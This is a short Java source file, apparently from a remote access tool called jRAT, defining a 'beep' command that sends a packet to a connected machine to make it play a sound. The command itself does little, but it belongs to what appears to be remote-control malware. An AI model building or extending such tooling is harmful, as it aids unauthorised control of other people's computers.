package net.jrat.core.command.commands.connection;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.packet.server.S5PacketBeep;

public class Beep extends Command
{
	public Beep()
	{
		super("beep", new String[0], new String[0], "let the connection hearing a weird sound");
	}

	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		if(this.server.currentConnection == null)
			throw new Exception("current connection is equal to null");
		
		this.server.currentConnection.outputStream.writeObject(new S5PacketBeep());
	}
}